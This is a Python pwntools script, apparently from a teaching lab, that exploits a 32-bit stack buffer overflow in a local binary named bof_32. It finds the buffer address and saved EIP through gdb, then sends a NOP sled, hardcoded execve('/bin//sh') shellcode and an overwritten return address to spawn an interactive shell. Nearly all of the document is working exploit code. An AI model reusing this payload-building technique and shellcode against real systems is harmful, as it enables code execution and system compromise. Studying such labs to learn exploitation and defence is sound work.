#!/usr/bin/env python
import sys
from pwn import *
#from struct import pack

#get hexa address
def get_address(what):
  str=''
  ok=False
  while (ok == False):
    str = input('[?] ' + what + ' (format 0x00000000): ')
    ok = (len(str) == 10) and (str[0:2] == '0x')
    for c in str[2:8]:
      ok &= ((c >= '0') and (c <='9')) or ((c >= 'a') and (c <='f'))  or ((c >= 'A') and (c <='F'))
      
  return  int(str,16).to_bytes(4,'little')

# ---- STEP1: run gdb to obtain payload information

print('[i] you can debug in gdb until the execution ends')
print('\n[!] do not close gdb for now!\n')
print('[i] we expect you to obtain in gdb:')
print('[i] 1) the buffer start address')
print('[i] 2) the value in saved eip when doIt returns')
print('\n[!] just copy-paste both values in 0x00000000 format for now\n')

#1 start a local process and attah it to gdb
#0 r = process('../bin/bof_32 <../dat/inBofPattern.pwntools.dat')
#1 r = process('../bin/bof_32')
#1 gdb.attach(r, '''b doIt\nc\n''')

# start gdb, add breakpoint, rn program nutil breakpoint
# will wait in gdb at breakpoint
print('[i] starting bof_32 in gdb')
p = gdb.debug('../bin/bof_32', '''b doIt\nc\n''')

# get prompt from running program
raw_input('[i] ------- prompt (hit return)?')
inp = p.recvuntil(b':',timeout=1)
print(inp.decode('ascii'))

# input pwntools pattern into vulnerable buffer
p.sendline(cyclic(800))

# get feedback from running program
raw_input('[i] ------- prompt (hit return)?')
inp = p.recvline()
print(inp.decode('ascii'))

# get information collected from gdb
# 1- buffer start address 
buf_adr = get_address('buffer start address')
# 2- pattern overwriting saved eip
sav_eip = get_address('saved eip value')

# we're done with gdb
print('\n[i] you can quit gdb now\n')

raw_input('[i] ------- prompt (hit return)?')

# ---- STEP2: build payload

# we get payload length from position of pattern overwriting saved eip in full pattern
pay_len = cyclic_find(sav_eip)
print('[i] payload size available before saved eip: ' + str(pay_len))
new_eip = buf_adr
print('[i] overwrite saved eip with buffer address: ' + str(new_eip))

#landing nops before shellcode
nop = b"\x90"*round(pay_len/2)
nop_len = len(nop)

#32-bits shellcode
shellcode  = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
shellcode += b"\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0"
shellcode += b"\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
shc_len = len(shellcode)
if (shc_len>pay_len):
    eprint("Shellcode is too long!!!\n")
    exit()

#padding after shellcode till saved eip
padding = b"A"*(pay_len-nop_len-shc_len)

#payload = nop + shellcode + padding + pack("<Q", saved eip)
payload = nop + shellcode + padding + new_eip

# ---- STEP3: run gdb to obtain a shell

# run again bof_32 in gdb but with no breakpoint
print('[i] starting again bof_32 in gdb')
p = gdb.debug('../bin/bof_32', '''c\n''')

# get prompt from running program
#raw_input('[i] ------- prompt (hit return)?')
inp = p.recvuntil(b':',timeout=1)
print(inp.decode('ascii'))

# input pwntools pattern into vulnerable buffer
p.sendline(payload)

# ---- STEP4: start interacting with shell

p.interactive()